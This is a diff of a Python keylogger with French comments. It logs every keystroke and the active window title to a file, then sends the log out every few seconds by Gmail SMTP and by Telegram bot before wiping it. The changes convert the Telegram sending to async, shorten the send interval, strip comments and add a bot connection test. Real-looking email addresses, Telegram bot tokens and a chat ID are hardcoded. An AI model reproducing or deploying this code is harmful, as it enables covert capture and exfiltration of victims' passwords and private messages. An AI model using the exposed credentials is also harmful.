@@ -3,51 +3,49 @@ import pygetwindow as gw
 import time
 import smtplib
 import threading
+import asyncio
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
 from email import encoders
 import telegram
+from datetime import datetime
 
 # --- CONFIGURATION DE L'ENVOI D'EMAIL ---
-# IMPORTANT: Utilisez un "Mot de passe d'application" généré par Google, pas votre mot de passe habituel.
-EMAIL_ADDRESS = "nkenfackloic2002@gmail.com"  # L'adresse email qui envoie les logs
-EMAIL_PASSWORD = "votre_mot_de_passe_application"  # Le mot de passe d'application de 16 caractères
-RECIPIENT_EMAIL = "nkenfacklandoloic@gmail.com" # L'adresse qui reçoit les logs
-SEND_INTERVAL = 36  # Intervalle d'envoi en secondes (3600s = 1 heure)
+EMAIL_ADDRESS = "nkenfackloic2002@gmail.com"
+EMAIL_PASSWORD = "votre_mot_de_passe_application"
+RECIPIENT_EMAIL = "nkenfacklandoloic@gmail.com"
+SEND_INTERVAL = 3  # Intervalle d'envoi en secondes
 LOG_FILE = "keylog.log"
-# -----------------------------------------
 
 # --- CONFIGURATION DE L'ENVOI TELEGRAM ---
-TELEGRAM_BOT_TOKEN = "7347047446:AAHT8BfaDJ-9tWgW4PEEuiOIch-uteeZlRk"  # Le token obtenu de BotFather
-TELEGRAM_CHAT_ID = "5622778224"        # L'ID de votre conversation avec le bot
-# -----------------------------------------
+TELEGRAM_BOT_TOKEN = "8018867438:AAFPnVkkSuND4R1bbqU5B6lDiAFFJFWQoKI"
+TELEGRAM_CHAT_ID = "5622778224"
 
-count = 0  # Compteur global
-active_window = "" # Garder en mémoire la fenêtre active
-
-# Un verrou pour éviter les conflits d'accès au fichier de log
+# Variables globales
+count = 0
+active_window = ""
 log_lock = threading.Lock()
 
 def on_press(key):
     global count, active_window
 
-    # Vérifier si la fenêtre active a changé
     try:
         current_window = gw.getActiveWindow().title
         if current_window != active_window:
             active_window = current_window
             with log_lock:
                 with open(LOG_FILE, "a", encoding="utf-8") as f:
-                    f.write(f"\n\n[WINDOW: {active_window} - {time.strftime('%Y-%m-%d %H:%M:%S')}]\n")
-    except Exception: # Gérer le cas où il n'y a pas de fenêtre active
+                    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+                    f.write(f"\n\n[WINDOW: {active_window} - {timestamp}]\n")
+    except Exception:
         pass
+
     with log_lock:
-        with open(LOG_FILE, "a", encoding="utf-8") as f: # Correction de l'indentation
+        with open(LOG_FILE, "a", encoding="utf-8") as f:
             try:
                 f.write(f"['{key.char}']")
             except AttributeError:
-                # Pour la touche Entrée, on va à la ligne
                 if key == keyboard.Key.enter:
                     f.write("[ENTER]\n")
                     count = 0
@@ -56,11 +54,10 @@ def on_press(key):
                 else:
                     f.write(f"[{key}]")
             count += 1
-            # Va à la ligne tous les 20 caractères pour la lisibilité
             if count >= 20:
                 f.write("\n")
                 count = 0
-    # Si la touche Echap est pressée, on arrête le listener
+
     if key == keyboard.Key.esc:
         return False
 
@@ -71,12 +68,12 @@ def send_log_by_email():
                 log_content = f.read()
                 if not log_content.strip():
                     print("Fichier de log vide, pas d'envoi.")
-                    return # Ne rien envoyer si le fichier est vide
+                    return
 
                 msg = MIMEMultipart()
                 msg['From'] = EMAIL_ADDRESS
                 msg['To'] = RECIPIENT_EMAIL
-                msg['Subject'] = f"Keylog Report - {time.strftime('%Y-%m-%d %H:%M:%S')}"
+                msg['Subject'] = f"Keylog Report - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
 
                 body = "Rapport des frappes clavier en pièce jointe."
                 msg.attach(MIMEText(body, 'plain'))
@@ -94,7 +91,6 @@ def send_log_by_email():
                 server.sendmail(EMAIL_ADDRESS, RECIPIENT_EMAIL, text)
                 server.quit()
 
-                # Vider le fichier après l'envoi réussi
                 f.seek(0)
                 f.truncate()
                 print(f"Log envoyé à {RECIPIENT_EMAIL} et fichier vidé.")
@@ -104,7 +100,7 @@ def send_log_by_email():
         except Exception as e:
             print(f"Erreur lors de l'envoi de l'email: {e}")
 
-def send_log_by_telegram():
+async def send_log_by_telegram():
     with log_lock:
         try:
             with open(LOG_FILE, "rb") as f:
@@ -113,16 +109,18 @@ def send_log_by_telegram():
                     print("Fichier de log vide, pas d'envoi Telegram.")
                     return
 
-                # IMPORTANT: Rembobiner le fichier avant de l'envoyer
                 f.seek(0)
-
                 bot = telegram.Bot(token=TELEGRAM_BOT_TOKEN)
                 caption = f"Rapport Keylogger - {time.strftime('%Y-%m-%d %H:%M:%S')}"
-                bot.send_document(chat_id=TELEGRAM_CHAT_ID, document=f, filename=LOG_FILE, caption=caption)
+                await bot.send_document(
+                    chat_id=TELEGRAM_CHAT_ID,
+                    document=f,
+                    filename=LOG_FILE,
+                    caption=caption
+                )
                 print(f"Log envoyé à Telegram (Chat ID: {TELEGRAM_CHAT_ID}).")
 
         except FileNotFoundError:
-            # Pas grave si le fichier n'existe pas encore
             pass
         except Exception as e:
             print(f"Erreur lors de l'envoi sur Telegram: {e}")
@@ -131,9 +129,18 @@ def report():
     while True:
         time.sleep(SEND_INTERVAL)
         send_log_by_email()
-        send_log_by_telegram() # On envoie aussi sur Telegram
+        asyncio.run(send_log_by_telegram())
+
+def test_telegram_connection():
+    try:
+        bot = telegram.Bot(token=TELEGRAM_BOT_TOKEN)
+        bot.send_message(chat_id=TELEGRAM_CHAT_ID, text="Test de connexion du bot")
+        print("Message de test envoyé avec succès!")
+    except Exception as e:
+        print(f"Erreur lors du test Telegram: {e}")
 
 if __name__ == "__main__":
+    test_telegram_connection()
     report_thread = threading.Thread(target=report, daemon=True)
     report_thread.start()
     print("Keylogger démarré. Envoi des logs toutes les heures. Appuyez sur 'Echap' pour arrêter.")
